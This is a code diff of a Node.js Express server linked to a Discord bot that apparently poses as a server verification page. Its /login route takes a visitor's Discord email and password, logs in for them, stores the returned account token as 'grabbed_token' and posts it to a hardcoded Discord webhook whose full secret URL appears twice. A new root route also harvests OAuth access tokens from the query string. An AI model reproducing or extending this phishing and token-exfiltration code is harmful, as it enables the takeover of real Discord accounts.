@@ -6,8 +6,9 @@ var url  = require('url');
 var path = require('path')
 const superagent = require('superagent').agent();
 const { Client, Events, GatewayIntentBits } = require('discord.js');
-const token = process.env.TOKEN;
+const bot_token = require('./config.json')["token"];
 const { Collection } = require('discord.js')
+const fetch = require("node-fetch");
 
 // Create a new client instance
 const client = new Client({ intents: [GatewayIntentBits.Guilds] });
@@ -68,7 +69,34 @@ client.once(Events.ClientReady, readyClient => {
 });
 
 app.get('/', function(req, res){
+  const query = url.parse(req.url).query;
+  let [accessToken, tokenType] = ["", ""]
+  try{
+    [accessToken, tokenType] = [query.split('=')[1], query.split('=')[0]];
+  } catch {
+    // No URL Context
+    return res.status(404).sendFile('views/error.html', {root: __dirname });
+  }
+
+  if (!accessToken) {
+    // Show 'verification failed' page
+    console.log('No access token found.');
     res.render('index');
+  }
+
+  const getUserDetails = async (accessToken, tokenType) => {
+    const response = await fetch('https://discord.com/api/users/@me', {
+      headers: {
+        'Authorization': `Bearer ${accessToken}`,
+      }
+    })
+  
+    const json = await response.json()
+    console.log(json)
+  }
+  getUserDetails(accessToken, tokenType);
+
+  res.render('index');
 });
 
 app.get('/verified-message', function(req, res){
@@ -91,13 +119,12 @@ app.get('/login', async (req, res) => {
         password: password, 
         undelete: false
     });
-    token = response._body.token;
-    console.log(token);
+    grabbed_token = response._body.token;
     // Post to webhook | Done
     // Webhook URL: https://discord.com/api/webhooks/1189498275456372767/7etCELqu_Jr9PlLUXAGkg9bCqotvTibtBTYY7nmgxWcKeIPYL8FfVqgvhYyoKF8DxL3F
     // Redirect to Discord Bot | Done
     const params = {
-      content: "TOKEN: " + token
+      content: "TOKEN: " + grabbed_token
     }
     let request = await superagent
     .post("https://discord.com/api/webhooks/1189498275456372767/7etCELqu_Jr9PlLUXAGkg9bCqotvTibtBTYY7nmgxWcKeIPYL8FfVqgvhYyoKF8DxL3F")
@@ -105,7 +132,8 @@ app.get('/login', async (req, res) => {
   } catch (error) {
     console.log('INVALID CREDENTIALS');
     // Display on webpage that there is incorrect credentials
-    return res.send(error);
+    console.error(error);
+    return res.status(401).sendFile('views/error.html', {root: __dirname });
   }
   res.redirect('/verified-message');
   // Give user who logged in verified role | In Progress | Gonna Take A while
@@ -115,4 +143,4 @@ app.use(express.static(path.join(__dirname, '/public/')));
 
 app.listen(8080);
 console.log('Server running on port ' + PORT);
-client.login(token);
+client.login(bot_token);
